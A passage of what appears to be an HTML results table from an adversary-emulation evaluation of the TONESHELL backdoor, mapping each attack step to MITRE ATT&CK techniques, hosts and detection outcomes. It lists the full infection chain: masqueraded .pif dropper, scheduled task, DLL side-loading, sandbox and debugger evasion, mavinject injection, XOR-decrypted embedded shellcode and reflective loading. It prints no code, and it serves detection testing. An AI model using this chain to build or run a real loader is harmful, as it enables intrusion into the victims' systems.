1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1036.008</td>
+<td>Masquerading: Masquerade File Type</td>
+<td>Windows</td>
+<td>The Assessing Westeros-Essos Global Influence.zip contained an executable that is masquerading as a .PIF file</td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL dropper <code v-pre>Assessing Westeros-Essos Global Influence.pif masquerades as a .PIF file</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td>-</td>
+<td><a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1204.002</td>
+<td>User Execution: Malicious File</td>
+<td>Windows</td>
+<td>btully executed the Assessing Westeros-Essos Global Influence.pif</td>
+<td>Calibrated - Not Benign</td>
+<td><code v-pre>btully</code> executes <code v-pre>Assessing Westeros-Essos Global Influence.pif</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td>-</td>
+<td><a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1083</td>
+<td>File and Directory Discovery</td>
+<td>Windows</td>
+<td>the .pif executable accessed C:\ProgramData\GFlagEditor</td>
+<td>Calibrated - Not Benign</td>
+<td>Malicious PIF file checks for presence of <code v-pre>C:\ProgramData\GFlagEditor</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/test4/dropper/dropper.cpp#L195-L206">Check Directory</a></td>
+<td><a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1053.005</td>
+<td>Scheduled Task/Job: Scheduled Task</td>
+<td>Windows</td>
+<td>the .pif executable created gflags.exe</td>
+<td>Calibrated - Not Benign</td>
+<td>Malicious PIF file creates a scheduled task to executes the legitimate binary <code v-pre>gflags.exe</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/test4/dropper/dropper.cpp#L243-L258">Create Scheduled Task</a></td>
+<td><a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>T1053.005</td>
+<td>Scheduled Task/Job: Scheduled Task</td>
+<td>Windows</td>
+<td>the .pif executable scheduled a task to execute glags.exe</td>
+<td>Calibrated - Not Benign</td>
+<td>Scheduled task executes the legitimate binary <code v-pre>gflags.exe</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td>-</td>
+<td><a href="https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit" class="outbound" target="_blank"><span>11</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1574.002</td>
+<td>Hijack Execution Flow: DLL Side-Loading</td>
+<td>Windows</td>
+<td>gflags.exe side loads an unsigned gflagsui.dll</td>
+<td>Calibrated - Not Benign</td>
+<td>Legitimate binary <code v-pre>gflags.exe</code> side-loads the TONESHELL loader DLL <code v-pre>gflagsui.dll</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/test4/gflagsui/gflagsui.def">DLL exports</a>, <a href="../../resources/toneshell/src/test4/gflagsui/dllmain.cpp#L72-L83">Exported function definitions</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html" class="outbound" target="_blank"><span>21</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf" class="outbound" target="_blank"><span>19</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1553.002</td>
+<td>Subvert Trust Controls: Code Signing</td>
+<td>Windows</td>
+<td>gflagsui.dll is signed with a self-signed cert</td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL loader DLL <code v-pre>gflagsui.dll</code> is signed</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/test4/gflagsui/cmakelists.txt#L61">DLL signed at build</a>, <a href="../../resources/toneshell/src/common/sign_artifact.ps1">Signing script</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/23/c/earth-preta-updated-stealthy-strategies.html" class="outbound" target="_blank"><span>21</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://csirt-cti.net/2024/01/23/stately-taurus-targets-myanmar/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://jsac.jpcert.or.jp/archive/2023/pdf/JSAC2023_1_2_nick-sunny-vickie_en.pdf" class="outbound" target="_blank"><span>19</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1497</td>
+<td>Virtualization/Sandbox Evasion</td>
+<td>Windows</td>
+<td>gflagsui.dll checks if the current process name matches gflags.exe using GetModuleFileNameW</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL loader checks if the current process name matches <code v-pre>gflags.exe</code> using GetModuleFileNameW</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/checks.cpp#L4-L38">VerifyProcessName</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1622</td>
+<td>Debugger Evasion</td>
+<td>Windows</td>
+<td>gflagsui.dll uses custom exceptions to hinder debuggers through IsDebuggerPresent</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL loader uses custom exceptions to hinder debuggers</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/handler.cpp#L181-L194">Throw custom exception</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1497</td>
+<td>Virtualization/Sandbox Evasion</td>
+<td>Windows</td>
+<td>gflagsui.dll checks for changes to the foreground windows through GetForeground*</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL loader checks for changes to the foreground window</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/checks.cpp#L40-L86">ForegroundWindowCheck</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1218.010</td>
+<td>System Binary Proxy Execution: Regsvr32</td>
+<td>Windows</td>
+<td>gflags.exe registered and re-executed itself using <code v-pre>regsvr32.exe /s</code></td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL loader registers and re-executes itself using <code v-pre>regsvr32.exe /s</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/register.cpp#L43-L109">RegisterSelf</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1218.013</td>
+<td>System Binary Proxy Execution: Mavinject</td>
+<td>Windows</td>
+<td>regsvr32.exe executed waitfor.exe which executed mavinject to inject gflagsui.dll into waitfor.exe</td>
+<td>Not Calibrated - Not Benign</td>
+<td><code v-pre>regsvr32.exe</code> spawns <code v-pre>waitfor.exe</code> then executes <code v-pre>mavinject</code> to inject the TONESHELL loader DLL <code v-pre>gflagsui.dll</code> into <code v-pre>waitfor.exe</code></td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/register.cpp#L112-L236">DllRegisterServer</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1027.009</td>
+<td>Obfuscated Files or Information: Embedded Payloads</td>
+<td>Windows</td>
+<td><code v-pre>gflagsui.dll</code> contains embedded shellcode in the data section</td>
+<td>Not Calibrated - Not Benign</td>
+<td>TONESHELL loader DLL <code v-pre>gflagsui.dll</code> contains embedded shellcode in the data section</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/embedded.hpp.in">Embedded Payload Header Template</a>, <a href="../../resources/toneshell/src/shellcode/cmakelists.txt#L90-L104">Embed shellcode at build time</a>, <a href="../../resources/toneshell/src/common/embed_payload.ps1">Payload Embed Script</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1140</td>
+<td>Deobfuscate/Decode Files or Information</td>
+<td>Windows</td>
+<td><code v-pre>gflagsui.dll</code> XOR decrypts embedded shellcode</td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL loader XOR decrypts embedded shellcode</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/xor.cpp">Xor Functions</a>, <a href="../../resources/toneshell/src/common/handler.cpp#L91">Decrypt shellcode</a></td>
+<td><a href="https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html" class="outbound" target="_blank"><span>18</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html" class="outbound" target="_blank"><span>22</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1620</td>
+<td>Reflective Code Loading</td>
+<td>Windows</td>
+<td><code v-pre>gflagsui.dll</code> reflectively loads and executes the shellcode</td>
+<td>Calibrated - Not Benign</td>
+<td>TONESHELL loader reflectively loads and executes the shellcode</td>
+<td>bitterbridge (10.26.4.103)</td>
+<td>btully</td>
+<td><a href="../../resources/toneshell/src/common/handler.cpp#L78-L100">Execute shellcode</a></td>
